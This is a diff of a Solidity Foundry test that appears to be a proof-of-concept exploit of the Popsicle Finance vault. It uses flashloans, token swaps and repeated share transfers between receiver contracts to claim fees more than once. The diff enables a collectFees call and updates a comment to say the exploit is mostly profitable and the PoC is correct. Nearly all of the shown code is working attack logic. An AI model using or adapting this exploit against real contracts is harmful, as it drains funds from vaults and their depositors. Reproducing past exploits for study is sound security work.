@@ -328,7 +328,7 @@ contract TokenVault {
         (succ,) = target.call(dataTocall);
     }
 }
-//Note we got most of the exploit working except the profit part,we are missing a few wei worth of coins from all the flashloaned assets,debug and fix
+//Note most of the vault attacks are in profit excent for wbtc and dai balances,something to check later,overall the poc is correct
 
 contract PopsicleExp is Test {
     using SafeERC20 for IERC20;
@@ -467,7 +467,6 @@ contract PopsicleExp is Test {
             uint256 missingAmt = bal >= (amounts[i] + premiums[i]) ? 0 : (amounts[i] + premiums[i]) - bal;
             address asset = assets[i];
             if (missingAmt > 0) {
-                // console.log("missing %d tokens for %s", missingAmt, assets[i]);
                 //We just swap,figure out why we are less here,maybe flashloan fees put  us lower?
                 router.swapExactTokensForTokens(
                     router.getAmountsIn(missingAmt, getPath(_weth, asset))[0],
@@ -553,18 +552,13 @@ contract PopsicleExp is Test {
         console.log("Self - Token0 Fees:", token0fees, "Token1 Fees:", token1fees);
         console.log("Receiver1 - Token0 Fees:", token0feesr1, "Token1 Fees:", token1feesr1);
         console.log("Receiver2 - Token0 Fees:", token0feesr2, "Token1 Fees:", token1feesr2);
-        // //Send all the fees to main exploit addr
-        // receiver1.transfer(IPopsicle(_vault).token0(), address(this));
-        // receiver1.transfer(IPopsicle(_vault).token1(), address(this));
-        // receiver2.transfer(IPopsicle(_vault).token0(), address(this));
-        // receiver2.transfer(IPopsicle(_vault).token1(), address(this));
     }
 
     function transferAround(address _vault) internal {
         console.log("entered transferaround");
         IERC20 asset = IERC20(_vault);
         uint256 bal = asset.balanceOf(address(this));
-        // IPopsicle(_vault).collectFees(0, 0);
+        IPopsicle(_vault).collectFees(0, 0);
         asset.transfer(address(receiver1), bal);
         receiver1.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, 0, 0));
         receiver1.transfer(_vault, address(receiver2));
